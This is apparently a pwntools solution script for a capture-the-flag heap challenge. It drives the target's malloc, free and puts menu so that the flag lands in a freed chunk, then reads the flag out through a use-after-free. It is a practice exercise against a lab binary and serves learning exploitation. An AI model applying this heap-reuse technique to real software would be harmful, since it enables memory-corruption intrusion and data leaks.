from pwn import *

io = process("/challenge/free-flag-fumble-hard")

def malloc(index:int, size: int):
    io.recvuntil(b"):")
    io.sendline(b"malloc")
    io.recvuntil(b"Index:")
    io.sendline(str(index).encode())
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())


def free(index:int):
    io.recvuntil(b"):")
    io.sendline(b"free")
    io.recvuntil(b"Index:")
    io.sendline(str(index).encode())


def puts(index:int):
    io.recvuntil(b"):")
    io.sendline(b"puts")
    io.recvuntil(b"Index:")
    io.sendline(str(index).encode())


def read_flag():
    io.recvuntil(b"):")
    io.sendline(b"read_flag")


malloc(0, 474)
malloc(1, 474)
free(1)
free(0)
read_flag()
puts(1)
io.interactive()
